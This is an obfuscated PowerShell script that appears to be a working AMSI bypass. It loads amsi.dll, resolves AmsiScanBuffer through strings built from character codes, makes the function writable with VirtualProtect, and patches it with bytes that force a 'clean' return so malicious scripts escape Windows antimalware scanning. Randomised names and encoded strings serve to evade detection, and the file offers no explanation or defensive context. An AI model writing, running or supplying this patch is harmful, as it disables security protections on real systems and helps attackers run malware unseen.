$l1yES1IcSGgS30wwz = @"
using System;
using System.Runtime.InteropServices;
public class l1yES1IcSGgS30wwz {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr PL3TyY, string MzXJaGTQCzSjVP10T_C);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr UREHShfQGQ_TUv, UIntPtr vwr5qzgI, uint fBD, out uint miu1SbfcD5pZrtL);
}
"@

Add-Type $l1yES1IcSGgS30wwz

$GyGCUpxjO1JvDzwug0 = [l1yES1IcSGgS30wwz]::LoadLibrary("$(('âmsî.d'+'ll').noRMALIze([char]([BYte]0x46)+[cHaR]([Byte]0x6f)+[CHAR](114*29/29)+[cHAr](109*93/93)+[cHAR]([bYtE]0x44)) -replace [ChAR](92+41-41)+[CHAR]([byTe]0x70)+[cHAR](123*32/32)+[ChAR](77*46/46)+[ChAr]([bYTE]0x6e)+[cHar](125*52/52))")
$jKJAGSf_6blkiJ = [l1yES1IcSGgS30wwz]::GetProcAddress($GyGCUpxjO1JvDzwug0, "$([CHAR](65)+[cHAR]([BytE]0x6d)+[ChAR]([BYTe]0x73)+[CHar]([bYTE]0x69)+[cHaR]([BytE]0x53)+[Char]([bYTE]0x63)+[cHAR](97+54-54)+[chaR](110)+[CHAr]([BYtE]0x42)+[ChaR](117+82-82)+[CHaR]([byTe]0x66)+[cHaR]([BYte]0x66)+[CHAR]([Byte]0x65)+[ChAR](45+69))")
$p = 0
[l1yES1IcSGgS30wwz]::VirtualProtect($jKJAGSf_6blkiJ, [uint32]5, 0x40, [ref]$p)
$QcGgNvMjRPF5nL = "0xB8"
$z4N_ = "0x57"
$S3mz = "0x00"
$otWTCj2B = "0x07"
$CVwUbai = "0x80"
$X7WGzTOLb3ad4xWuPV = "0xC3"
$KwZ99 = [Byte[]] ($QcGgNvMjRPF5nL,$z4N_,$S3mz,$otWTCj2B,+$CVwUbai,+$X7WGzTOLb3ad4xWuPV)
[System.Runtime.InteropServices.Marshal]::Copy($KwZ99, 0, $jKJAGSf_6blkiJ, 6)